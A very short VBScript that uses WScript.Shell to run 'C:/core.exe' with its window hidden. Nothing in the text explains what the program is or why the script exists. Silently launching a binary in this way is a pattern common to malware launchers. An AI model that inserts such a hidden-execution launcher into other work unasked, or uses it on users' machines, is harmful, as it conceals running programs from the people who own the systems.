Dim shell
Dim obj

Set shell = WScript.CreateObject("WScript.Shell")
obj = shell.Run("C:/core.exe", 0)

Set shell = Nothing